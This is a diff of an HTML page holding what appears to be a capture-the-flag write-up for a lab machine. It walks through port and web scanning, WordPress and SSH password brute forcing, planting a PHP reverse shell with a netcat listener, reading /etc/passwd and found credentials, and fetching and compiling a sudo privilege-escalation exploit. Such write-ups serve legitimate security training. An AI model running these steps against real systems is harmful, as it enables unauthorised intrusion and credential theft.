@@ -4,155 +4,155 @@
 <span class=nb>echo</span> <span class=nv>$IP</span>
 nmap -sC -sV <span class=nv>$IP</span>
 nikto -h <span class=nv>$IP</span>
-</code></pre></div> <details class=output> <summary>Nmap output</summary> <div class=highlight><pre><span></span><code>nmap -sC -sV <span class=nv>$IP</span>
-Nmap scan report <span class=k>for</span> <span class=m>10</span>.10.156.30
-Host is up <span class=o>(</span><span class=m>0</span>.020s latency<span class=o>)</span>.
-Not shown: <span class=m>998</span> closed ports
-PORT   STATE SERVICE VERSION
-<span class=m>22</span>/tcp open  ssh     OpenSSH <span class=m>7</span>.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol <span class=m>2</span>.0<span class=o>)</span>
-<span class=p>|</span> ssh-hostkey:
-<span class=p>|</span>   <span class=m>2048</span> 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e <span class=o>(</span>RSA<span class=o>)</span>
-<span class=p>|</span>   <span class=m>256</span> ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 <span class=o>(</span>ECDSA<span class=o>)</span>
-<span class=p>|</span>_  <span class=m>256</span> b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff <span class=o>(</span>ED25519<span class=o>)</span>
-<span class=m>80</span>/tcp open  http    Apache httpd <span class=m>2</span>.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
-<span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
-<span class=p>|</span>_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div> <details class=output> <summary>Nmap output</summary> </details> <div class=highlight><pre><span></span><code> nmap -sC -sV <span class=nv>$IP</span>
+ Nmap scan report <span class=k>for</span> <span class=m>10</span>.10.156.30
+ Host is up <span class=o>(</span><span class=m>0</span>.020s latency<span class=o>)</span>.
+ Not shown: <span class=m>998</span> closed ports
+ PORT   STATE SERVICE VERSION
+ <span class=m>22</span>/tcp open  ssh     OpenSSH <span class=m>7</span>.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol <span class=m>2</span>.0<span class=o>)</span>
+ <span class=p>|</span> ssh-hostkey:
+ <span class=p>|</span>   <span class=m>2048</span> 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e <span class=o>(</span>RSA<span class=o>)</span>
+ <span class=p>|</span>   <span class=m>256</span> ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 <span class=o>(</span>ECDSA<span class=o>)</span>
+ <span class=p>|</span>_  <span class=m>256</span> b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff <span class=o>(</span>ED25519<span class=o>)</span>
+ <span class=m>80</span>/tcp open  http    Apache httpd <span class=m>2</span>.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
+ <span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
+ <span class=p>|</span>_http-title: Apache2 Ubuntu Default Page: It works
+ Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned <span class=k>in</span> <span class=m>8</span>.50 seconds
-</code></pre></div> </details> <details class=output> <summary>nikto output</summary> <div class=highlight><pre><span></span><code>nikto -h <span class=nv>$IP</span>
-- Nikto v2.1.6
----------------------------------------------------------------------------
-+ Target IP:          <span class=m>10</span>.10.156.30
-+ Target Hostname:    <span class=m>10</span>.10.156.30
-+ Target Port:        <span class=m>80</span>
----------------------------------------------------------------------------
-+ Server: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=k>in</span> a different fashion to the MIME <span class=nb>type</span>
-+ No CGI Directories found <span class=o>(</span>use <span class=s1>&#39;-C all&#39;</span> to force check all possible <span class=nb>dirs</span><span class=o>)</span>
-+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip
-+ Apache/2.4.29 appears to be outdated <span class=o>(</span>current is at least Apache/2.4.37<span class=o>)</span>. Apache <span class=m>2</span>.2.34 is the EOL <span class=k>for</span> the <span class=m>2</span>.x branch.
-+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
-+ Uncommon header <span class=s1>&#39;x-ob_mode&#39;</span> found, with contents: <span class=m>1</span>
-+ OSVDB-3233: /icons/README: Apache default file found.
-+ /phpmyadmin/: phpMyAdmin directory found
-+ Cookie wordpress_test_cookie created without the httponly flag
-+ /blog/wp-login.php: Wordpress login found
-+ <span class=m>8042</span> requests: <span class=m>0</span> error<span class=o>(</span>s<span class=o>)</span> and <span class=m>11</span> item<span class=o>(</span>s<span class=o>)</span> reported on remote host
----------------------------------------------------------------------------
-+ <span class=m>1</span> host<span class=o>(</span>s<span class=o>)</span> tested
-</code></pre></div> </details> <details class=output> <summary>gobuster output</summary> <div class=highlight><pre><span></span><code>gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
-===============================================================
-/blog                 (Status: 301) [Size: 311] [--&gt; http://10.10.156.30/blog/]
-/wordpress            (Status: 301) [Size: 316] [--&gt; http://10.10.156.30/wordpress/]
-/javascript           (Status: 301) [Size: 317] [--&gt; http://10.10.156.30/javascript/]
-/phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://10.10.156.30/phpmyadmin/]
-/server-status        (Status: 403) [Size: 277]
-</code></pre></div> </details> <details class=output> <summary>Wordpress output</summary> <div class=highlight><pre><span></span><code>wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
-_______________________________________________________________
-        __          _______   _____
-        \ \        / /  __ \ / ____|
-        \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-        \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
-            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned <span class=k>in</span> <span class=m>8</span>.50 seconds
+</code></pre></div> <details class=output> <summary>nikto output</summary> </details> <div class=highlight><pre><span></span><code> nikto -h <span class=nv>$IP</span>
+ - Nikto v2.1.6
+ ---------------------------------------------------------------------------
+ + Target IP:          <span class=m>10</span>.10.156.30
+ + Target Hostname:    <span class=m>10</span>.10.156.30
+ + Target Port:        <span class=m>80</span>
+ ---------------------------------------------------------------------------
+ + Server: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
+ + The anti-clickjacking X-Frame-Options header is not present.
+ + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=k>in</span> a different fashion to the MIME <span class=nb>type</span>
+ + No CGI Directories found <span class=o>(</span>use <span class=s1>&#39;-C all&#39;</span> to force check all possible <span class=nb>dirs</span><span class=o>)</span>
+ + Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip
+ + Apache/2.4.29 appears to be outdated <span class=o>(</span>current is at least Apache/2.4.37<span class=o>)</span>. Apache <span class=m>2</span>.2.34 is the EOL <span class=k>for</span> the <span class=m>2</span>.x branch.
+ + Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
+ + Uncommon header <span class=s1>&#39;x-ob_mode&#39;</span> found, with contents: <span class=m>1</span>
+ + OSVDB-3233: /icons/README: Apache default file found.
+ + /phpmyadmin/: phpMyAdmin directory found
+ + Cookie wordpress_test_cookie created without the httponly flag
+ + /blog/wp-login.php: Wordpress login found
+ + <span class=m>8042</span> requests: <span class=m>0</span> error<span class=o>(</span>s<span class=o>)</span> and <span class=m>11</span> item<span class=o>(</span>s<span class=o>)</span> reported on remote host
+ ---------------------------------------------------------------------------
+ + <span class=m>1</span> host<span class=o>(</span>s<span class=o>)</span> tested
+</code></pre></div> <details class=output> <summary>gobuster output</summary> </details> <div class=highlight><pre><span></span><code> gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
+ ===============================================================
+ /blog                 (Status: 301) [Size: 311] [--&gt; http://10.10.156.30/blog/]
+ /wordpress            (Status: 301) [Size: 316] [--&gt; http://10.10.156.30/wordpress/]
+ /javascript           (Status: 301) [Size: 317] [--&gt; http://10.10.156.30/javascript/]
+ /phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://10.10.156.30/phpmyadmin/]
+ /server-status        (Status: 403) [Size: 277]
+</code></pre></div> <details class=output> <summary>Wordpress output</summary> </details> <div class=highlight><pre><span></span><code> wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
+ _______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+         \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+             \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
-        WordPress Security Scanner by the WPScan Team
-                        Version 3.8.17
-    Sponsored by Automattic - https://automattic.com/
-    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+     Sponsored by Automattic - https://automattic.com/
+     @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+ _______________________________________________________________
 
-Interesting Finding(s):
+ Interesting Finding(s):
 
-[+] Headers
-| Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
-| Found By: Headers (Passive Detection)
-| Confidence: 100%
+ [+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
 
-[+] XML-RPC seems to be enabled: http://10.10.156.30/wordpress/xmlrpc.php
-| Found By: Direct Access (Aggressive Detection)
-| Confidence: 100%
-| References:
-|  - http://codex.wordpress.org/XML-RPC_Pingback_API
-|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
-|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
-|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
-|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+ [+] XML-RPC seems to be enabled: http://10.10.156.30/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
-[+] WordPress readme found: http://10.10.156.30/wordpress/readme.html
-| Found By: Direct Access (Aggressive Detection)
-| Confidence: 100%
+ [+] WordPress readme found: http://10.10.156.30/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
 
-[+] The external WP-Cron seems to be enabled: http://10.10.156.30/wordpress/wp-cron.php
-| Found By: Direct Access (Aggressive Detection)
-| Confidence: 60%
-| References:
-|  - https://www.iplocation.net/defend-wordpress-from-ddos
-|  - https://github.com/wpscanteam/wpscan/issues/1299
+ [+] The external WP-Cron seems to be enabled: http://10.10.156.30/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
 
-[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
-| Found By: Emoji Settings (Passive Detection)
-|  - http://10.10.156.30/wordpress/, Match: &#39;wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2&#39;
-| Confirmed By: Meta Generator (Passive Detection)
-|  - http://10.10.156.30/wordpress/, Match: &#39;WordPress 5.4.2&#39;
+ [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.156.30/wordpress/, Match: &#39;wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2&#39;
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.156.30/wordpress/, Match: &#39;WordPress 5.4.2&#39;
 
-[i] The main theme could not be detected.
+ [i] The main theme could not be detected.
 
-[+] Enumerating All Plugins (via Passive Methods)
+ [+] Enumerating All Plugins (via Passive Methods)
 
-[i] No plugins Found.
+ [i] No plugins Found.
 
-[+] Enumerating Config Backups (via Passive and Aggressive Methods)
-Checking Config Backups - Time: 00:00:01 &lt;============================================&gt; (137 / 137) 100.00% Time: 00:00:01
+ [+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 &lt;============================================&gt; (137 / 137) 100.00% Time: 00:00:01
 
-[i] No Config Backups Found.
+ [i] No Config Backups Found.
 
-[+] Performing password attack on Xmlrpc against 1 user/s
-[SUCCESS] - admin / my2boys
-Trying admin / lizzy Time: 00:01:19 &lt;                                             &gt; (3885 / 14348276)  0.02%  ETA: ??:??:??
+ [+] Performing password attack on Xmlrpc against 1 user/s
+ [SUCCESS] - admin / my2boys
+ Trying admin / lizzy Time: 00:01:19 &lt;                                             &gt; (3885 / 14348276)  0.02%  ETA: ??:??:??
 
-[!] Valid Combinations Found:
-| Username: admin, Password: my2boys
+ [!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
 
-[!] No WPScan API Token given, as a result vulnerability data has not been output.
-[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-</code></pre></div> </details> <p>So now we can login to wordpress as admin and look around.</p> <p>The wordpress page reveals a private note on credentals of william being william:arnold147 sofar this doesnt seem usable</p> <h2 id=wordpress-php-reverse-shell>Wordpress php reverse shell</h2> <p>I used this <a href=https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php>php reverse shell</a>, modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g. <code>nc -lvnp 6666</code> and call a page that doesn't exist e.g. <code>/blog/index.php/2020/08/03/50/</code> with e.g. curl.</p> <p>We now get a reverse shell but no TTY so we can try this: <code>python -c 'import pty; pty.spawn("/bin/sh")'</code> or this <code>/bin/sh -i</code>.</p> <p>Let's have a look around:</p> <details class=output> <summary>cat /etc/passwd output</summary> <div class=highlight><pre><span></span><code>cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-lxd:x:105:65534::/var/lib/lxd/:/bin/false
-uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
-dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:109:1::/var/cache/pollinate:/bin/false
-sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
-aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
-mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
-</code></pre></div> </details> <p>The /home path shows one user "aubreanna" so let's use this to crack ssh using hydra:</p> <div class=highlight><pre><span></span><code>hydra -l aubreanna -P rockyou.txt <span class=m>10</span>.10.156.30 ssh
+ [!] No WPScan API Token given, as a result vulnerability data has not been output.
+ [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+</code></pre></div> <p>So now we can login to wordpress as admin and look around.</p> <p>The wordpress page reveals a private note on credentals of william being william:arnold147 sofar this doesnt seem usable</p> <h2 id=wordpress-php-reverse-shell>Wordpress php reverse shell</h2> <p>I used this <a href=https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php>php reverse shell</a>, modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g.<code>nc -lvnp 6666</code> and call a page that doesn't exist e.g.<code>/blog/index.php/2020/08/03/50/</code> with e.g. curl.</p> <p>We now get a reverse shell but no TTY so we can try this:<code>python -c 'import pty; pty.spawn("/bin/sh")'</code> or this<code>/bin/sh -i</code>.</p> <p>Let's have a look around:</p> <details class=output> <summary>cat /etc/passwd output</summary> </details> <div class=highlight><pre><span></span><code> cat /etc/passwd
+ root:x:0:0:root:/root:/bin/bash
+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+ bin:x:2:2:bin:/bin:/usr/sbin/nologin
+ sys:x:3:3:sys:/dev:/usr/sbin/nologin
+ sync:x:4:65534:sync:/bin:/bin/sync
+ games:x:5:60:games:/usr/games:/usr/sbin/nologin
+ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+ uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+ irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+ gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+ systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+ syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+ messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+ _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+ lxd:x:105:65534::/var/lib/lxd/:/bin/false
+ uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+ dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+ landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+ pollinate:x:109:1::/var/cache/pollinate:/bin/false
+ sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+ aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
+ mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre></div> <p>The /home path shows one user "aubreanna" so let's use this to crack ssh using hydra:</p> <div class=highlight><pre><span></span><code>hydra -l aubreanna -P rockyou.txt <span class=m>10</span>.10.156.30 ssh
 </code></pre></div> <p>In parallel we can look for files containing "aubreanna":</p> <div class=highlight><pre><span></span><code>find ./ -type f -iname <span class=s2>&quot;*.txt&quot;</span> -exec grep -l <span class=s2>&quot;aubreanna&quot;</span> <span class=o>{}</span> <span class=se>\;</span> <span class=m>2</span>&gt;/dev/null
 ./opt/wp-save.txt
 cat wp-save.txt
@@ -161,7 +161,7 @@ Bill,
 Aubreanna needed these credentials <span class=k>for</span> something later.  Let her know you have them and where they are.
 
 aubreanna:bubb13guM!@#123
-</code></pre></div> <h2 id=aubreanna>Aubreanna</h2> <p>So let's login via aubreanna: <code>ssh aubreanna@10.10.156.30</code> and we find the first flag (user.txt) in the home dir.</p> <p>Unfortunately <code>sudo -l</code> is not allowed</p> <div class=highlight><pre><span></span><code>aubreanna@internal:~$ sudo -l
+</code></pre></div> <h2 id=aubreanna>Aubreanna</h2> <p>So let's login via aubreanna:<code>ssh aubreanna@10.10.156.30</code> and we find the first flag (user.txt) in the home dir.</p> <p>Unfortunately<code>sudo -l</code> is not allowed</p> <div class=highlight><pre><span></span><code>aubreanna@internal:~$ sudo -l
 <span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> aubreanna:
 Sorry, user aubreanna may not run sudo on internal.
 aubreanna@internal:~$ id
@@ -176,7 +176,7 @@ define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
 define( &#39;DB_USER&#39;, &#39;wordpress&#39; );
 define( &#39;DB_PASSWORD&#39;, &#39;wordpress123&#39; );
 define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
-</code></pre></div> <p>We also see we have Sudo running in version <code>1.8.21</code> and a check with searchsploit <code>searchsploit sudo</code> reveals a vulnerability to <code>1.8.20</code> "Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation", but no luck running the <a href=https://www.exploit-db.com/raw/42183>exploit</a>.</p> <p>@Kali</p> <div class=highlight><pre><span></span><code>wget -O exploit.c https://www.exploit-db.com/raw/42183
+</code></pre></div> <p>We also see we have Sudo running in version<code>1.8.21</code> and a check with searchsploit<code>searchsploit sudo</code> reveals a vulnerability to<code>1.8.20</code> "Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation", but no luck running the <a href=https://www.exploit-db.com/raw/42183>exploit</a>.</p> <p>@Kali</p> <div class=highlight><pre><span></span><code>wget -O exploit.c https://www.exploit-db.com/raw/42183
 gcc -o exploit exploit.c
 scp exploit aubreanna@10.10.156.30:~/exploit
 </code></pre></div> <p>@aubreanna@internal</p> <div class=highlight><pre><span></span><code>chmod +x exploit
